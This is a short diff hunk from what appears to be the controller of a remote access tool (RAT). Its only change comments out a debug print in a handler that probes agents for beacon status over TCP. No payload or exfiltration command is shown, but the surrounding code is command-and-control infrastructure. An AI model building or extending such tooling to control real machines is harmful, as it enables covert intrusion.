@@ -213,7 +213,7 @@ class Handler(threading.Thread):
             # Check RAT-STATUS
             if not self.beacon_wait:            # If not in mode that could jumble up the output to and from the agent with the beacons, because if we're in that mode then we know its beaconing already
 
-                print("beacon_wait: "+str(self.beacon_wait))
+                # print("beacon_wait: "+str(self.beacon_wait))
                 if self.transport_type == "TCP":
                     try:
                         msg = self.execute("beacon-probe", True)
